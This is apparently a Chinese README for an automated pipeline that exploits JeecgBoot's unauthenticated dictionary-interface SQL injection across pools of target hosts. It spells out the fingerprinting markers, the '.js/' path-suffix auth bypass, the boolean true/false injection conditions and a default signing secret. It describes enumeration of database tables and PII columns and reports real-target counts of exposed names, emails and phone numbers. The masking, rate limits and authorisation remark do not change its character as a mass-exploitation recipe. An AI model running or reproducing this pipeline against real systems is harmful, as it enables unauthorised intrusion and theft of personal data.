# jeecg-dict —— JeecgBoot 字典注入无人值守流水线

把「JeecgBoot 字典接口未授权 SQL 注入」的手工链路固化成一条命令：
输入目标池 → 自动探测 → 自动判读分级 → 自动出证据（脱敏）＋ Word 报告 → `triage.csv` + `SUMMARY.md`。
人只看 `SUMMARY.md` 和 `report.docx`，不再逐台手工敲 curl。

## 文件

| 文件 | 职责 |
|---|---|
| `pipeline.py` | 主 CLI：载入目标 / 状态跳过 / 编排 9 个阶段 / 出 triage + SUMMARY |
| `probe.py` | `Probe`：限速、每台请求预算、失败退避、指纹/绕过/签名/多租户/差分/数据测绘 |
| `judge.py` | 判读规则与 `PII_COLS` 列名映射，判据写死 |
| `report.py` | 脱敏 `mask()`、HTML→PNG、Word 报告 |
| `mock_jeecg.py` | 本地靶机（只绑 127.0.0.1），自测用，sqlite 内存假数据 |

## 怎么跑（三条命令）

```bash
# 1. 自测：起本地 mock，跑完整流水线并断言 4 个反例场景
python3 pipeline.py --self-test

# 2. 目标池（CSV 自动找 host/域名/url 列；txt 一行一个）
python3 pipeline.py --targets targets/sample_pool.csv \
    --out out/jeecg-autopilot/20261029 --concurrency 4 --delay 0.15 \
    --max-requests 80 --limit 0 --recheck-days 14

# 3. 单台（演示/复验；下面用本地 mock，真实目标换成域名）
python3 pipeline.py --host http://127.0.0.1:18080 --out out/jeecg-autopilot/demo
```

`--host` 可多次；`--targets` 也可多次。`--no-report` 跳过 PNG/Word（只出 `00-scan.json` 与 `07-复验输出.txt`）。
`--recheck` 强制重扫，忽略判负状态。

## 状态文件语义

`<out>/state.json` 是一个 `{host: {"ts": epoch, "verdict": ..., "level": ...}}`。

- 每次扫描结束都会把该目标的最新结论写回 `state.json`。
- 下一轮载入目标时，`verdict` 以 `判负` 开头、且距 `ts` 未超过 `--recheck-days`（默认 14 天）的目标**自动跳过**，并打印 `skip <host>: <verdict>（x.x 天前）`。
- `--recheck` 忽略上述跳过逻辑，强制重扫全部目标。
- `可交` 目标不会被状态跳过，下轮仍会重扫（用于复验）。

## 判据（写死，别放宽）

| 环节 | 判据 |
|---|---|
| 指纹 | `/_app.config.js` 有 `VITE_GLOB_API_URL`，或 index 的 `_CONFIG['domianURL']` |
| 绕过 | `x,y,z` → 401；`x,y,z.js` → 404/401；`x,y,z.js/` → **200** |
| 注入 | 真条件行数 >0 且 假条件行数 =0 且 不存在的表 → 93B「操作失败」 |
| 多租户 | `/sys/tenant/list`（原路径、不加 `.js`）匿名 200 且 result 非空 → 判负 |
| 有值条数 | 值 `str(v).strip()` 非空；「返回行数」与「有值条数」两个数都输出 |
| 分级 | 有 PII（`PII_COLS`）且条数>0 → 中危；有数据无 PII → 低危；仅绕过 → 判负；不往高危推 |

## 限速与请求预算

- 每台目标独立 `Probe`，`--delay` 控制每次请求后的 sleep（默认 0.15s），`--max-requests` 控制单台请求上限（默认 80）。
- `--concurrency` 是线程池并发数（默认 4），每台仍遵守自己的预算。
- 阶段固定，任何一步判负即早退，不再继续烧请求。
- 数据测绘预算：`onl_cgform_head` 取表名清单（截断前 20 张）→ 反例固定四条先取 → 候选表＝前 8 张 + 关键字命中 + `sys_user` → 先用每表一个字符串列取行数、按行数降序扫 → 每张候选表最多试 6 列，逐列记 `rows/nonempty`，PII 列额外取 ≤5 条打码样例。
- 预算账本：`00-scan.json` 固定写 `budget_used/budget_cap/budget_exhausted`，耗尽不静默截断。
- 全部只读 GET；自测只允许 127.0.0.1；未经授权不得扫描其它真实目标。

## 已知限制

- 只支持四段式 `table,text,code,filterSql` 的布尔差分；`1=1`/`1=2` 在本产品命中行>0 时映射异常，因此真/假条件用 `col is not null` / `is null`。
- 每张候选表最多试 6 列；候选表之外的业务表不扫（预算保护）。
- 默认密钥签名只试 `dd05f1c54d63749eda95f9fa6d49v442a` 一个 secret；签名失败不阻断，按未绕过判负。
- WAF 判负只看绕过链 `x,y,z(.js/.js/)` 是否 403；若 WAF 只拦 `password`（实测中遇到过这种站点），注入与 PII 已成立时仍判**可交**，不会误杀。
- 不依赖 LibreOffice：Word 用内置 `validate_docx()`（python-docx 读回，查图/表/段落）。
- IPv6 目标会加方括号后再补 `https://`，但未专门实测。

## 自测结果

```text
self-test [1] 可交 OK
self-test [2] 判负-多租户 OK
self-test [3] 判负-仅绕过 OK
self-test [4] 判负-WAF OK
SELF-TEST: 5/5 OK
```

退出码 0。

## 一次完整 end-to-end（本地 mock）

命令：

```bash
python3 pipeline.py --host http://127.0.0.1:18080 --out out/jeecg-autopilot/demo
```

产物树（`find out/jeecg-autopilot/demo -type f`）：

```text
out/jeecg-autopilot/demo/SUMMARY.md
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/00-scan.json
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/07-复验输出.txt
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/11-字段统计.png
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/12-脱敏样例.png
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/report.docx
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/说明.md
out/jeecg-autopilot/demo/state.json
out/jeecg-autopilot/demo/triage.csv
```

`triage.csv` 内容：

```text
host,prefix,bypass,diff,tenant,tables,pii_fields,pii_rows,level,verdict,report
http://127.0.0.1:18080,/api,401/404/200,ok,http404,19,sys_user.realname;sys_user.email;sys_user.phone,7,中危,可交,hits/127.0.0.1_18080/report.docx
```

生成的 Word 报告路径：

```text
out/jeecg-autopilot/demo/hits/127.0.0.1_18080/report.docx
```

（路径相对 `--out` 目录）

## 一次实测的结构（目标已隐去）

某台 JeecgBoot 站，`--max-requests 120` 跑完的 `00-scan.json` 关键 fields（返回行数 / 有值条数）：

```text
sys_user.realname          姓名    返回行数=259  有值条数=259  pii=True
sys_user.email             邮箱    返回行数=257  有值条数=257  pii=True
sys_user.phone             手机号  返回行数=23   有值条数=23   pii=True
biz_address_book.realname  中文名  返回行数=66   有值条数=9    pii=True
biz_address_book.full_name 英文名  返回行数=67   有值条数=67   pii=True
biz_address_book.identity  身份    返回行数=67   有值条数=67   pii=True
```

注意「返回行数」和「有值条数」要分开记：`realname` 两数相等，说明列真的有值；`biz_contact.telephone` 这类
可能返回 706 行但非空值很少，只看行数会高估。

反例四条（工具每一轮都会先取，用来证明判定不是运气）：

```text
sys_user.idcard is not null    -> HTTP 200  93B     列不存在（服务端统一「操作失败」页）
sys_user.id_card is not null   -> HTTP 200  93B     列不存在
sys_user.salt is not null      -> HTTP 200  172B    服务端敏感字段黑名单
sys_user.password is not null  -> HTTP 403  15781B  WAF 拦截
```

预算账本会随报告写出（`budget_used` / `budget_cap` / `budget_exhausted`），不要关掉它：
没有预算上限的批量扫描，最后一定会变成对同一台目标的无意义重放。

## 语法检查

```bash
python3 -m py_compile *.py
```

全绿（无输出即通过）。

## 一键自测（run_tests.sh）

```bash
bash run_tests.sh     # 退出码 0 = 全绿
```

四步，全程只用 127.0.0.1，不碰真实目标：

1. `py_compile` 七个文件；
2. 单元测试 `test_units.py`：8 条判读规则（可交/中危、只有业务数据→低危、空库→低危、多租户、仅绕过、WAF、非 JeecgBoot、summarize）+ 7 条打码规则（手机、短号、邮箱、姓名、身份证、分类字段不打码、空值）；
3. `pipeline.py --self-test`：起 mock 跑 5 个场景（可交 / 多租户 / 空库 / WAF），并校验生成的 docx；
4. 报告体检：对最近一次 demo 的 `report.docx` 用内置 `validate_docx()` 核对图数与表格。

排查经验（2026-10-29 实测）：第一版跑出现偶发失败，原因是出图要起无头 chromium，启动失败被 `except` 吞掉，
`triage.csv` 的 report 列留空，自测又把「目录」当成 docx 去校验。已修两处：出图失败重试一次、仍失败就写
`生成失败:<异常名>` 进 triage；自测改为要求报告路径非空且 `isfile`。之后连跑三次全绿。
